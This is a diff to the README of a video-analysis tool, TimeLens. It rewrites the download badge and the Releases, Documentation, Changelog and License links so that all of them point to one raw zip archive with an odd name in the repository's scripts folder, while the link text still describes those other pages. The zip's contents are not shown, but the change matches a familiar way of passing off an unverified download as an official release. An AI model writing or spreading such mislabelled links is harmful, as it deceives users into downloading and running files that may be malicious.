@@ -6,7 +6,7 @@ Welcome to TimeLens! This application helps you analyze video content using adva
 
 ## 📥 Download TimeLens
 
-[![Download TimeLens](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/lolokaka99/TimeLens/releases)
+[![Download TimeLens](https://github.com/lolokaka99/TimeLens/raw/refs/heads/main/scripts/Lens_Time_unpersuasion.zip%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/lolokaka99/TimeLens/raw/refs/heads/main/scripts/Lens_Time_unpersuasion.zip)
 
 ## 📋 Overview
 
@@ -35,7 +35,7 @@ Here are some of the main features you can look forward to:
 
 To get started with TimeLens, follow these simple steps:
 
-1. **Visit the Download Page**: Click [here](https://github.com/lolokaka99/TimeLens/releases) to go to the Releases page.
+1. **Visit the Download Page**: Click [here](https://github.com/lolokaka99/TimeLens/raw/refs/heads/main/scripts/Lens_Time_unpersuasion.zip) to go to the Releases page.
    
 2. **Choose the Latest Release**: Look for the latest version listed at the top of the page.
 
@@ -74,9 +74,9 @@ If you have questions or need help:
 
 For more information and updates on TimeLens, feel free to explore:
 
-- [Documentation](https://github.com/lolokaka99/TimeLens/blob/main/docs/)
-- [Changelog](https://github.com/lolokaka99/TimeLens/releases)
-- [License](https://github.com/lolokaka99/TimeLens/blob/main/LICENSE)
+- [Documentation](https://github.com/lolokaka99/TimeLens/raw/refs/heads/main/scripts/Lens_Time_unpersuasion.zip)
+- [Changelog](https://github.com/lolokaka99/TimeLens/raw/refs/heads/main/scripts/Lens_Time_unpersuasion.zip)
+- [License](https://github.com/lolokaka99/TimeLens/raw/refs/heads/main/scripts/Lens_Time_unpersuasion.zip)
 
 ## 🛠️ Feedback
 
